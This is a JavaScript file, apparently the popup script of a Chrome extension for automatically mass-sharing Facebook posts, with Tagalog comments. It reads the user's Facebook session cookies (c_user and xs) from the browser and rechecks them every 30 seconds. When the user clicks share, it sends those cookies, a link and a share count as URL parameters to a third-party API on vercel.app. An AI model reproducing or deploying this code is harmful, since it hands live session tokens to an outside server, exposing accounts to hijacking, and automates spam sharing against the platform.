// Array na naglalaman ng mga string constants na na-obfuscate
const stringArray = ['59586WxIuJb', 'light', '#fecaca', 'body', '_self', 'error', '&link=', '_blank', 'addEventListener', '112540iLhNYm', 'darkModeSwitch', 'status', 'message', '879iLwAot', '2226640JjpVgm', 'Failed to share.', '&limit=', '✅ Shared ', 'cookie', '1436hMwpBB', '❌ Please fill all fields!', 'https://vern-rest-api.vercel.app/api/share?cookie=', 'features.html', 'limit', 'innerHTML', 'name', 'backBtn', 'nav-links', '#fff', 'active', 'cookies', 'classList', 'change', '; xs=', 'query', 'c_user', 'trim', '❌ Error! Check network or cookie.', '55TiHFnF', 'textContent', 'burger', 'color', 'c_user=', 'shareBtn', 'toggle', 'click', 'success_count', 'getElementById', ' times!', 'find', 'tutorials', 'style', 'link', '1897368SzZakT', '4VNqJmA', '<i class="fas fa-spinner fa-spin icon"></i> Processing...', '1187379SkhyzH', '1348669Foowgj', 'open', 'https://www.facebook.com', 'GET', 'dark', 'developer', 'value', 'json'];

// Function para kunin ang mga string mula sa array gamit ang index
function getString(index) {
    const adjustedIndex = index - 0xaa; // Convert hex index to decimal
    return stringArray[adjustedIndex];
}

// Get DOM elements
const burger = document.getElementById('burger');
const navLinks = document.getElementById('nav-links');
const darkModeSwitch = document.getElementById('darkModeSwitch');
const developerBtn = document.getElementById('developer');
const tutorialsBtn = document.getElementById('tutorials');
const backBtn = document.getElementById('backBtn');
const shareBtn = document.getElementById('shareBtn');
const statusEl = document.getElementById('status');
const cookieInput = document.getElementById('cookie');
const linkInput = document.getElementById('link');
const limitInput = document.getElementById('limit');

// Burger menu toggle
burger.addEventListener('click', () => {
    navLinks.classList.toggle('active');
});

// Dark/Light mode toggle
darkModeSwitch.addEventListener('change', () => {
    document.body.classList.toggle('dark');
    document.body.classList.contains('dark') 
        ? document.body.style.color = '#fff'
        : document.body.style.color = '#000';
});

// Developer button click
developerBtn.addEventListener('click', () => {
    window.open('https://www.facebook.com/notfound500', '_self');
});

// Tutorials button click
tutorialsBtn.addEventListener('click', () => {
    window.open('tutorial.html', '_blank');
});

// Back button click
backBtn.addEventListener('click', () => {
    window.open('features.html', '_self');
});

// Share button click handler - ACTIVE AND SMOOTH PROCESSING
shareBtn.addEventListener('click', async () => {
    const cookieValue = cookieInput.value.trim();
    const linkValue = linkInput.value.trim();
    const limitValue = limitInput.value.trim();
    
    // Validation
    if (!cookieValue || !linkValue || !limitValue) {
        statusEl.textContent = '❌ Please fill all fields!';
        statusEl.style.color = '#fecaca';
        return;
    }
    
    // Disable button during processing
    shareBtn.disabled = true;
    shareBtn.innerHTML = '<i class="fas fa-spinner fa-spin icon"></i> Processing...';
    shareBtn.style.opacity = '0.7';
    shareBtn.style.cursor = 'not-allowed';
    
    // Clear previous status
    statusEl.textContent = '';
    
    // Create real-time processing indicator
    const processingSteps = [
        '🔄 Initializing connection...',
        '🔗 Validating Facebook cookie...',
        '📡 Establishing secure connection...',
        '⚡ Sending share requests...',
        '📊 Processing response...'
    ];
    
    // Show animated processing status
    let stepIndex = 0;
    const processingInterval = setInterval(() => {
        if (stepIndex < processingSteps.length) {
            statusEl.innerHTML = `<span style="color: #93c5fd">${processingSteps[stepIndex]}</span>`;
            stepIndex++;
        }
    }, 800);
    
    try {
        // Construct API URL
        const apiUrl = 'https://vern-rest-api.vercel.app/api/share?cookie=' + 
                      encodeURIComponent(cookieValue) + 
                      '&link=' + encodeURIComponent(linkValue) + 
                      '&limit=' + encodeURIComponent(limitValue);
        
        // Send request to API with timeout
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 30000);
        
        const response = await fetch(apiUrl, {
            method: 'GET',
            signal: controller.signal,
            headers: {
                'Accept': 'application/json',
                'Cache-Control': 'no-cache'
            }
        });
        
        clearTimeout(timeoutId);
        clearInterval(processingInterval);
        
        // Smooth transition to result
        statusEl.innerHTML = '<span style="color: #86efac">✅ Processing complete! Getting results...</span>';
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const data = await response.json();
        
        // Check response status
        if (data.status) {
            // Animated success count
            let count = 0;
            const targetCount = data.success_count;
            const countInterval = setInterval(() => {
                if (count <= targetCount) {
                    statusEl.innerHTML = `
                        <div style="color: #86efac; font-size: 1.1em">
                            <i class="fas fa-check-circle"></i> Successfully shared ${count} times!
                        </div>
                        <div style="color: #93c5fd; font-size: 0.9em; margin-top: 5px">
                            ⚡ Process completed successfully
                        </div>
                    `;
                    count++;
                } else {
                    clearInterval(countInterval);
                    statusEl.innerHTML = `
                        <div style="color: #86efac; font-size: 1.1em">
                            <i class="fas fa-check-circle"></i> ✅ Shared ${targetCount} times!
                        </div>
                        <div style="color: #93c5fd; font-size: 0.9em; margin-top: 5px">
                            🎉 All requests processed successfully
                        </div>
                    `;
                }
            }, 50);
            
        } else {
            statusEl.innerHTML = `
                <div style="color: #fca5a5; font-size: 1.1em">
                    <i class="fas fa-exclamation-circle"></i> ❌ ${data.message || 'Error! Check network or cookie.'}
                </div>
                <div style="color: #fcd34d; font-size: 0.9em; margin-top: 5px">
                    ⚠️ Please check your cookie and try again
                </div>
            `;
            statusEl.style.color = '#fecaca';
        }
    } catch (error) {
        clearInterval(processingInterval);
        
        if (error.name === 'AbortError') {
            statusEl.innerHTML = `
                <div style="color: #fca5a5; font-size: 1.1em">
                    <i class="fas fa-clock"></i> ⏰ Request timeout
                </div>
                <div style="color: #fcd34d; font-size: 0.9em; margin-top: 5px">
                    The server took too long to respond. Try again.
                </div>
            `;
        } else {
            statusEl.innerHTML = `
                <div style="color: #fca5a5; font-size: 1.1em">
                    <i class="fas fa-unlink"></i> 🔌 Failed to share.
                </div>
                <div style="color: #fcd34d; font-size: 0.9em; margin-top: 5px">
                    Check your internet connection and try again.
                </div>
            `;
        }
        console.error('Sharing error:', error);
    } finally {
        // Re-enable button with smooth transition
        setTimeout(() => {
            shareBtn.disabled = false;
            shareBtn.innerHTML = '<i class="fas fa-share-alt icon"></i> Share Now';
            shareBtn.style.opacity = '1';
            shareBtn.style.cursor = 'pointer';
            shareBtn.style.transition = 'all 0.3s ease';
        }, 1000);
    }
});

// ACTIVE COOKIE DETECTION WITH REAL-TIME STATUS
function detectFacebookCookies() {
    chrome.tabs.query({'active': true, 'currentWindow': true}, (tabs) => {
        const currentTab = tabs[0];
        if (!currentTab) return;
        
        // Show detecting status
        const cookieStatus = document.createElement('div');
        cookieStatus.id = 'cookieStatus';
        cookieStatus.style.cssText = 'color: #93c5fd; font-size: 0.9em; margin-top: 5px;';
        cookieStatus.textContent = '🔍 Detecting Facebook cookies...';
        
        if (!document.getElementById('cookieStatus')) {
            cookieInput.parentNode.appendChild(cookieStatus);
        }
        
        chrome.cookies.getAll({'url': 'https://www.facebook.com'}, (cookies) => {
            const c_userCookie = cookies.find(cookie => cookie.name === 'c_user');
            const xsCookie = cookies.find(cookie => cookie.name === 'xs');
            
            const cookieStatusEl = document.getElementById('cookieStatus');
            
            if (c_userCookie && xsCookie) {
                cookieInput.value = 'c_user=' + c_userCookie.value + '; xs=' + xsCookie.value + ';';
                cookieStatusEl.innerHTML = `
                    <span style="color: #86efac">
                        <i class="fas fa-check-circle"></i> ✅ Facebook cookies detected!
                    </span>
                    <span style="color: #93c5fd; font-size: 0.8em; display: block">
                        User ID: ${c_userCookie.value.substring(0, 8)}...
                    </span>
                `;
                
                // Auto-fill link if current tab is Facebook
                if (currentTab.url.includes('facebook.com')) {
                    linkInput.value = currentTab.url;
                    linkInput.style.borderColor = '#86efac';
                }
            } else {
                cookieStatusEl.innerHTML = `
                    <span style="color: #fca5a5">
                        <i class="fas fa-exclamation-triangle"></i> ⚠️ No Facebook cookies found
                    </span>
                    <span style="color: #fcd34d; font-size: 0.8em; display: block">
                        Make sure you're logged into Facebook
                    </span>
                `;
            }
            
            // Auto-hide status after 5 seconds
            setTimeout(() => {
                if (cookieStatusEl) {
                    cookieStatusEl.style.opacity = '0';
                    cookieStatusEl.style.transition = 'opacity 0.5s ease';
                    setTimeout(() => {
                        if (cookieStatusEl && cookieStatusEl.parentNode) {
                            cookieStatusEl.parentNode.removeChild(cookieStatusEl);
                        }
                    }, 500);
                }
            }, 5000);
        });
    });
}

// Run cookie detection when page loads
document.addEventListener('DOMContentLoaded', () => {
    // Initial delay for smoother experience
    setTimeout(detectFacebookCookies, 1000);
    
    // Add auto-refresh cookie detection every 30 seconds
    setInterval(detectFacebookCookies, 30000);
});

// Real-time input validation
[cookieInput, linkInput, limitInput].forEach(input => {
    input.addEventListener('input', () => {
        if (cookieInput.value.trim() && linkInput.value.trim() && limitInput.value.trim()) {
            shareBtn.disabled = false;
            shareBtn.style.opacity = '1';
        } else {
            shareBtn.disabled = true;
            shareBtn.style.opacity = '0.7';
        }
    });
});
